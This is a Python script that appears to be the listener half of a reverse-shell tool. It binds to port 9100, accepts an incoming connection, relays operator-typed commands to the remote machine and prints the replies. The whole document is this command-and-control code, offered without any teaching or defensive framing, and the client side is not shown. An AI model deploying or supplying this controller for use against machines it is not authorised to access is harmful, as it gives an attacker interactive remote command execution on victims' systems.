import socket
import sys


def socket_create():
    try:
        global host
        global port
        global sock
        host = ''
        port = 9100
        sock = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


# Bind socket to port and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global sock
        print('Binding socket to port: ' + str(port))
        sock.bind((host, port))
        sock.listen(5)
    except socket.error as msg:
        print('Socket binding error: ' + str(msg) + '\n' + 'Retrying...')
        socket_bind()

# Establish a connection with client (socket must be listening for them)


def socket_accept():
    conn, address = sock.accept()
    print('Connection has been established | ' + 'IP ' + address[0] + ' | Port ' + str(address[1]))
    send_commands(conn)
    conn.close()

# Sends commands


def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            sock.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='\n')


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()